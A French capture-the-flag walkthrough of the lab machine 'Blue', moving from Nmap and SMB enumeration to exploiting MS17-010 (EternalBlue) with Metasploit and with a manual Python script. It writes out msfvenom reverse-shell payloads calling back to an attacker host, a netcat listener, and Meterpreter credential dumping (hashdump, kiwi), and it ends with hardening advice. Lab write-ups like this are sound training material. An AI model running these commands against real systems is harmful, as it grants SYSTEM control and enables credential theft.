![Cover](cover.png)

### 1. Reconnaissance & Scanning

Ma phase de reconnaissance commence par un scan **TCP** complet pour identifier la surface d'attaque. J'utilise **Nmap** avec une cadence élevée pour gagner en efficacité, suivi d'un scan de services ciblé.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.40

# Scan détaillé des services identifiés
nmap -p 135,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.10.40
```

Le scan révèle les ports classiques d'un environnement **Windows** :
*   **135/TCP** : **MSRPC**
*   **139/TCP** : **NetBIOS-ssn**
*   **445/TCP** : **Microsoft-ds** (SMB)

L'énumération via les scripts par défaut de **Nmap** identifie précisément la cible : **Windows 7 Professional 7601 Service Pack 1**. L'absence de **Message Signing** sur le protocole **SMBv2** est une première indication de faiblesse de configuration.

### 2. Énumération du service SMB

J'approfondis l'analyse du service **SMB** pour vérifier l'existence de partages accessibles sans authentification (**Null Session**).

```bash
# Énumération des partages avec smbmap (astuce du faux utilisateur pour forcer la session Guest)
smbmap -H 10.10.10.40 -u "0xdf" -p "0xdf"

# Exploration manuelle des partages identifiés
smbclient //10.10.10.40/Users
```

Bien que les partages `Share` et `Users` soient lisibles en **READ ONLY**, ils ne contiennent que des répertoires par défaut. L'intérêt de cette machine ne réside pas dans la fuite de données via les partages, mais dans la vulnérabilité intrinsèque du service.

### 3. Identification de la vulnérabilité : MS17-010

Compte tenu de la version obsolète de l'OS (**Windows 7**), je suspecte immédiatement une vulnérabilité de type **Remote Code Execution (RCE)** liée à l'implémentation du protocole **SMBv1**. J'utilise le moteur de scripts **NSE** pour confirmer cette hypothèse.

```bash
nmap -p 445 --script vuln -oA scans/nmap-smbvulns 10.10.10.40
```

Le résultat est sans appel : la machine est vulnérable à **MS17-010**, également connue sous le nom de **ETERNALBLUE**. Cette faille permet une corruption du **Kernel Pool** via des paquets **SMBv1** malformés.

> **Schéma Mental :**
> **Scan de ports** (445 ouvert) -> **Fingerprinting OS** (Windows 7 SP1) -> **Analyse de vulnérabilité** (Vérification SMBv1) -> **Confirmation MS17-010** -> **Exploitation Kernel**.

### 4. Vecteur d'entrée : Exploitation d'ETERNALBLUE

Je privilégie deux approches pour obtenir un accès initial avec les privilèges les plus élevés (**SYSTEM**).

#### Option A : Framework Metasploit (Méthode Rapide)
C'est la méthode la plus stable pour ce vecteur. Le module exploite la corruption de mémoire pour injecter un **Payload** directement dans le processus système.

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.14
set payload windows/x64/meterpreter/reverse_tcp
run
```

#### Option B : Script Python Manuel (Approche "OSCP-like")
Pour éviter l'usage de Metasploit, j'utilise une version modifiée des scripts de **Worawit** (comme `send_and_execute.py`). Cette méthode nécessite un environnement **Python 2** et l'installation de la bibliothèque **Impacket**.

1.  **Génération du Payload :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

2.  **Exécution de l'exploit :**
Le script va uploader l'exécutable sur le partage `C$` via la faille **MS17-010**, créer un service temporaire et l'exécuter.

```bash
# Dans un environnement virtuel Python 2
python send_and_execute.py 10.10.10.40 rev.exe
```

### 5. Premier Shell & Stabilisation

Une fois l'exploit déclenché, je reçois une connexion sur mon **Listener** netcat.

```bash
rlwrap nc -lnvp 443
```

Le shell obtenu est immédiatement **NT AUTHORITY\SYSTEM**, car l'exploit **ETERNALBLUE** s'exécute au niveau du **Kernel**. Aucune **Privilege Escalation** supplémentaire n'est requise.

```cmd
C:\Windows\system32> whoami
nt authority\system
```

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois l'accès initial obtenu via l'exploitation de la vulnérabilité **MS17-010**, l'objectif est de stabiliser la session, de valider le contexte de sécurité et de procéder à l'extraction des données sensibles. Sur cette machine, l'exploitation mène directement au privilège le plus élevé, court-circuitant les étapes habituelles d'**Escalade de Privilèges** locale.

#### 1. Validation des Privilèges et Stabilisation
Après l'exécution du module **EternalBlue**, la session **Meterpreter** ou le **Reverse Shell** s'exécute dans le contexte du processus `lsass.exe`.

```bash
# Vérification de l'identité de l'utilisateur
getuid # Dans Meterpreter
whoami # Dans un shell CMD

# Informations système pour confirmer l'architecture
sysinfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

> **Schéma Mental :** L'attaque **MS17-010** exploite une corruption de mémoire dans le pool non-paginé du noyau Windows lors de la manipulation de paquets **SMBv1** malformés. Puisque le service **SMB** tourne avec les privilèges **SYSTEM**, l'injection de code (shellcode) hérite directement de ces droits, éliminant le besoin d'un mouvement latéral interne pour compromettre la machine.

#### 2. Énumération Post-Exploitation (Méthode Manuelle)
Si l'exploitation est réalisée via le script Python `send_and_execute.py`, il est nécessaire de préparer un environnement spécifique pour gérer les dépendances **Impacket** en **Python 2.7**, car de nombreux exploits originaux n'ont pas été portés sur Python 3.

```bash
# Création d'un environnement virtuel pour Python 2.7
virtualenv impacket-venv -p $(which python2)
source impacket-venv/bin/activate

# Installation d'Impacket
pip install .

# Génération d'un Payload non-staged avec MSFVenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

#### 3. Logique de Mouvement Latéral et Persistance
Bien que l'accès **SYSTEM** soit immédiat, dans un scénario d'infrastructure plus large (Active Directory), cette machine servirait de point d'appui (**Pivot**) pour attaquer le reste du domaine.

*   **Extraction de Hashs :** Utilisation de **Mimikatz** (via `load kiwi` dans Meterpreter) pour dumper le **SAM** (Security Account Manager) ou extraire des tickets **Kerberos** en mémoire.
*   **Recherche de Tokens :** Vérification des processus actifs pour trouver des jetons d'accès appartenant à des **Domain Admins**.

```bash
# Extraction des hashs locaux (SAM)
hashdump

# Utilisation de Kiwi pour énumérer les credentials en mémoire
load kiwi
creds_all
```

#### 4. Extraction des Flags (Data Exfiltration)
L'énumération du système de fichiers permet de localiser les preuves de compromission. Sous Windows, les fichiers de flags se trouvent généralement sur les **Desktops** des utilisateurs et de l'administrateur.

```cmd
# Navigation vers les répertoires utilisateurs
cd C:\Users
dir /s user.txt root.txt

# Lecture des fichiers
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

> **Schéma Mental :** Dans une phase de post-exploitation standard, si l'accès avait été limité à l'utilisateur `haris`, j'aurais dû rechercher des **Unquoted Service Paths**, des **Scheduled Tasks** mal configurées ou des mots de passe stockés dans le **Registry** pour atteindre le niveau **SYSTEM**. Ici, la vulnérabilité critique du protocole **SMB** agit comme un "Golden Ticket" direct vers le contrôle total du kernel.

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Sur cette machine, l'étape d'exploitation initiale et l'élévation de privilèges sont confondues en une seule action. La vulnérabilité **MS17-010**, connue sous le nom de **ETERNALBLUE**, permet une exécution de code à distance (**Remote Code Execution - RCE**) directement au niveau du **Kernel** Windows. Puisque le service **SMBv1** tourne avec les privilèges les plus élevés, l'exploitation réussie nous octroie immédiatement un accès **NT AUTHORITY\SYSTEM**.

#### 1. Vecteur d'Exploitation : MS17-010 (ETERNALBLUE)

L'analyse de vulnérabilité via **Nmap** a confirmé que la cible est vulnérable au **CVE-2017-0143**. Cette faille réside dans la manière dont le driver `srv.sys` gère les paquets **SMBv1** malformés, entraînant une corruption de la **Non-Paged Kernel Pool**.

> **Schéma Mental :**
> L'attaque exploite une confusion de type et un dépassement de tampon dans la mémoire du noyau. En envoyant des paquets spécifiquement forgés, l'attaquant peut écraser des structures de données en mémoire système. L'objectif est de modifier les jetons de sécurité (**Access Tokens**) du processus courant ou d'injecter une **Shellcode** directement dans l'espace mémoire du **Kernel** pour forcer l'exécution d'un payload avec les privilèges **SYSTEM**.

#### 2. Méthode A : Exploitation via Metasploit

C'est la méthode la plus stable pour ce vecteur. Le module `ms17_010_eternalblue` automatise la corruption du pool et l'injection du **Meterpreter**.

```bash
# Configuration du module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.14
msf6 exploit(ms17_010_eternalblue) > run

# Vérification des privilèges
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
```

#### 3. Méthode B : Exploitation Manuelle (Python & Impacket)

Pour une approche sans **Metasploit** (type OSCP), j'utilise une variante du script `zzz_exploit.py` nommée `send_and_execute.py`. Ce script nécessite un environnement **Python 2** et la bibliothèque **Impacket**.

**Étape 1 : Préparation du Payload**
Je génère un exécutable de type **Reverse Shell** non-staged avec **msfvenom**.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

**Étape 2 : Exécution de l'exploit**
Le script va exploiter la vulnérabilité pour uploader `rev.exe` sur le partage `C$` et créer un service via le **Service Control Manager (SCM)** pour l'exécuter.

```bash
# Activation de l'environnement Python 2
source impacket-venv/bin/activate

# Lancement de l'exploit (utilisation d'un username arbitraire pour forcer l'auth)
python send_and_execute.py 10.10.10.40 rev.exe 
```

**Étape 3 : Capture du Shell**
En parallèle, un listener **netcat** intercepte la connexion entrante.

```bash
rlwrap nc -lnvp 443
# Connexion reçue de 10.10.10.40
C:\Windows\system32> whoami
nt authority\system
```

#### 4. Domination & Récupération des Flags

Une fois le niveau de privilège **SYSTEM** atteint, l'accès aux fichiers sensibles est total. Les flags se trouvent dans les répertoires personnels des utilisateurs.

```cmd
:: Flag Utilisateur
type C:\Users\haris\Desktop\user.txt

:: Flag Root
type C:\Users\Administrator\Desktop\root.txt
```

---

### Analyse Post-Exploitation "Beyond Root"

L'analyse de la machine **Blue** révèle plusieurs faiblesses structurelles typiques des environnements post-2017 non maintenus :

1.  **Absence de Patch Management** : La machine tourne sous **Windows 7 SP1** sans les mises à jour de sécurité critiques de mars 2017. Le patch **KB4012598** aurait suffi à neutraliser l'attaque.
2.  **Protocole Obsolète** : Le protocole **SMBv1** est activé par défaut. Dans un environnement durci, ce protocole doit être désactivé au profit de **SMBv2** ou **SMBv3**, qui intègrent des protections contre les manipulations de mémoire de ce type.
3.  **Null Sessions & Guest Access** : La configuration SMB autorisait l'énumération des partages (`Users`, `Share`) sans authentification valide (ou avec des identifiants arbitraires), facilitant la phase de reconnaissance initiale.
4.  **Message Signing** : Le paramètre `message_signing` était désactivé. Bien que non requis pour **ETERNALBLUE**, cela aurait permis d'autres attaques de type **SMB Relay** si des utilisateurs s'étaient connectés au réseau.

**Recommandation Red Team** : Toujours privilégier l'exploitation manuelle via Python dans des environnements instables, car **Metasploit** peut parfois provoquer un **BSOD (Blue Screen of Death)** sur les cibles x64 si la corruption du pool mémoire ne se déroule pas exactement comme prévu.